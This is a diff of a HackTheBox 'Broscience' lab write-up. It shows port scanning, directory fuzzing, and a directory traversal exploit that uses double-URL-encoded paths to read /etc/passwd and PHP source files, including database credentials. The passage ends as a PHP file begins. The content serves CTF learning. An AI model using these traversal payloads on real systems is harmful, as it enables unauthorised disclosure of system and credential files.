@@ -13,28 +13,28 @@ summary: ""
 ---
 HackTheBox Broscience is a Linux machine rated Medium. This machine is flawed with broken access control(A01:2021), cryptographic failures(A02:2021), software and data integrity failures(A08:2021), and injection(A03:2021).
 
-Attack Chain: An initial source code disclosure caused by a directory traversal vulnerability, improper implementation of activation token, and exploiting an insecure deserialization gave the attacker an initial foothold. Further exploiting a shell injection vulnerability within a certificate renewal script elevated the attacker's privileges to the root user.
+Attack Chain: A source code disclosure caused by a directory traversal vulnerability, improper implementation of activation token, and exploiting an insecure deserialization gave the attacker an initial foothold. Further exploiting a shell injection vulnerability within a certificate renewal script elevated the attacker's privileges to the root user.
 
 #### Initialization
 ```bash
 # connect to vpn
-sudo openvpn --auth-nocache --config lab_kralyn.ovpn
+sudo openvpn --auth-nocache --config lab_connection.ovpn
 ``` 
 
 #### Enumeration
 ```bash
 # discover ports and services
-nmap --max-rate=500 -sC -sV -Pn -sS -sU -vvv -oA nmap_broscience 10.10.11.195
-xsltproc nmap_broscience.xml -o nmap_broscience.html         # converts xml to html
-firefox nmap_broscience.html      # view in browser
-#--snip--#
+sudo nmap --max-rate=500 -sSUVC -Pn -vvv -oA nmap_broscience 10.10.11.195
+xsltproc nmap_broscience.xml -o nmap_broscience.html    # converts xml to html
+firefox nmap_broscience.html    # view in browser
+#-snip-#
 22/tcp open  OpenSSH 8.9p1 Ubuntu 3 
 80/tcp open  Apache httpd 2.4.54 (GET HEAD POST OPTIONS)
 443/tcp open Apache httpd 2.4.54 ((Debian)) (GET HEAD POST OPTIONS)
 
 # discover technologies used
 whatweb 10.10.11.195        # if domain exits add to host file and rerun command
-#--snip--#
+#-snip-#
 HTTPServer[Debian Linux][Apache/2.4.54 (Debian)]
 RedirectLocation[https://broscience.htb/]
 
@@ -46,7 +46,7 @@ echo '10.10.11.195 broscience.htb' | sudo tee -a /etc/hosts
 
 # investigate existing headers
 curl -I -k https://broscience.htb
-#--snip--#
+#-snip-#
 HTTP/1.1 200 OK
 Date: Wed, 12 Apr 2023 10:21:00 GMT
 Server: Apache/2.4.54 (Debian)
@@ -79,39 +79,39 @@ ffuf -c -u https://broscience.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Cont
 
 # with gobuster
 gobuster dir -u https://broscience.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 50 -k -q
-#--snip--#
-/images        301
-/includes      301 
-/manual        301
-/styles        301
-/javascript    301
+#-snip-#
+301    /images 
+301    /includes       
+301    /manual        
+301    /styles        
+301    /javascript    
 
 # with dirsearch
 dirsearch -u https://broscience.htb/ -t 50 -q
-#--snip--#
-/login.php           200
-/includes/           200
-/images/             200
-/index.php           200
-/logout.php          302
-/javascript          301
-/manual/index.html   200
-/manual/             301
-/register.php        200
-/user.php            200
+#-snip-#
+200    /login.php           
+200    /includes/           
+200    /images/             
+200    /index.php           
+302    /logout.php
+301    /javascript          
+200    /manual/index.html   
+301    /manual/             
+200    /register.php        
+200    /user.php            
 
 # with wfuzz
 wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt --hc 404 -t 50  https://broscience.htb/FUZZ
-#--snip--#
-/register.php    200
-/index.php       200
-/login.php       200
-/.htaccess       403
-/user.php        200
-/comment.php     302
-/activate.php    200
-/logout.php      302
-/update_user.php 302
+#-snip-#
+200    /register.php    
+200    /index.php       
+200    /login.php       
+403    /.htaccess       
+200    /user.php        
+302    /comment.php     
+200    /activate.php    
+302    /logout.php      
+302    /update_user.php 
 ```
 
 #### Exploration
@@ -143,7 +143,7 @@ curl -sk 'https://broscience.htb/includes/img.php?path=../../../etc/passwd' | ht
 Error: Attack detected.
 
 curl -sk https://broscience.htb/includes/img.php?path=$(urlencode $(urlencode ../../../../etc/passwd)) | grep sh$     # get the users with shell
-#--snip--#
+#-snip-#
 root:x:0:0:root:/root:/bin/bash
 bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
 postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
@@ -200,7 +200,7 @@ wfuzz -c -u https://broscience.htb/includes/img.php?path=FUZZ -w dotdotpwn.txt -
 000005201: 200 39 L  64 W  2235 Ch  ".%2e%252f.%2e%252f.%2e%252f.%2e%252f.%2e%252fetc%252fpasswd"       
 SNIP
 ```
-Studied the code in exfiltrated files. `db_connect.php` displays a postgres engine database credentials not publicly accessible. The `img.php` filters some words, decodes the path before displaying the passed file using a known php function, `file_get_contents`, vulnerable to directory traversal. Leveraged chat-gpt in understanding the `utils.php`
+Studied the code in exfiltrated files. `db_connect.php` displays a postgres engine database credentials not publicly accessible. The `img.php` filters some words, decodes the path before displaying the passed file using a known php function, `file_get_contents`, vulnerable to directory traversal. Leveraged chat-gpt in understanding the `utils.php`  
 [db_connect.php](#db_connect.php)
 ```php
 <?php
